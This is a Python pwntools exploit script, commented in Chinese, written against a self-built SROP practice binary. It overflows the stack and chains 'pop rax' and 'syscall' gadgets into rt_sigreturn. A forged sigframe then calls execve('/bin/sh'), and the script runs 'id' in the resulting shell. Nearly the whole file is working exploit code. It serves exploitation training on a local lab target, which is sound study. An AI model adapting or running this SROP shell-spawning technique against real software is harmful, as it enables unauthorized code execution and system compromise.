#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_srop_baby —— 自造 SROP 靶场（不是真实赛题）

题目行为：
  name:     read(0, 0x403010, 0x100)   -> 把 "/bin/sh\\0" 写进已知 bss
  exploit:  read(0, rsp, 0x400)        -> 栈溢出
            ret                          -> 返回地址来自栈上

可用 gadget：
  0x401065  syscall; ret
  0x401068  pop rax; ret

利用（SROP）：
  1) name 阶段先送 "/bin/sh\\0" 到 bss
  2) 溢出：pop rax; ret -> rax=15 -> syscall; ret -> rt_sigreturn
     -> 伪造的 sigframe 里直接 execve("/bin/sh", NULL, NULL)

为什么必须 SROP：
  NX 开启（PT_GNU_STACK=RW），栈不可执行；程序里没有 pop rdi/pop rsi/pop rdx，
  也没有 libc，常规 ROP 传参凑不出 execve 的三个参数。
"""

import sys

from pwn import *

context(os="linux", arch="amd64", log_level="info")

BIN = "./chal"
HOST, PORT = "127.0.0.1", 0  # 自造题默认只跑本地；需要远程自己起 socat/nc

SYSCALL_RET = 0x401065
POP_RAX_RET = 0x401068
BSS_BUF = 0x403010

NR_RT_SIGRETURN = 15
NR_EXECVE = 59


def start() -> tube:
    if len(sys.argv) > 1 and sys.argv[1].upper() == "REMOTE":
        if not PORT:
            raise SystemExit("[-] 这是自造题，没有远程服务；只跑本地")
        return remote(HOST, PORT)
    return process(BIN)


def pwn() -> None:
    io = start()

    # ---- 1) 把 "/bin/sh\0" 放到 bss ----
    io.recvuntil(b"name: ")
    io.send(b"/bin/sh\x00")

    # ---- 2) 伪造 sigframe：直接 execve("/bin/sh", 0, 0) ----
    frame = SigreturnFrame()
    frame.rax = NR_EXECVE
    frame.rdi = BSS_BUF
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = SYSCALL_RET
    frame.rsp = BSS_BUF + 0x80

    payload = p64(POP_RAX_RET) + p64(NR_RT_SIGRETURN) + p64(SYSCALL_RET) + bytes(frame)
    log.info("payload: %d bytes", len(payload))

    io.recvuntil(b"exploit: ")
    io.send(payload)

    io.sendline(b"echo __PWNED__; id")
    print(io.recvrepeat(1.0).decode(errors="replace"))
    io.close()


if __name__ == "__main__":
    pwn()
